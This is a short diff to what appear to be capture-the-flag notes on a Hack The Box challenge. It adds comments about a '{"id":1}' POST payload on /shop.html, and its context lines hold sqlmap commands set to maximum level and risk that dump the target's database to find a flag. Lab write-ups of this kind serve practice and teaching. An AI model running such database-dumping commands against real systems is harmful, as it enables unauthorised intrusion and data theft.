@@ -13,6 +13,7 @@ sqlmap --batch --dump -u '$TGTHOST' --random-agent --dump --batch --level 5 --ri
 
 # Flag regex: (HTB{.+})
 
-# found a post request for /shop.html when adding shoes to cart
+# found a post request for /shop.html when adding shoes to cart.
+# inspecting the page network traffic we find the request payload raw showing '{"id":1}'
 # ran command to get max result, probably not best for realworld
 sqlmap --batch --dump -u '$TGTHOST' --random-agent --dump --batch --level 5 --risk 3
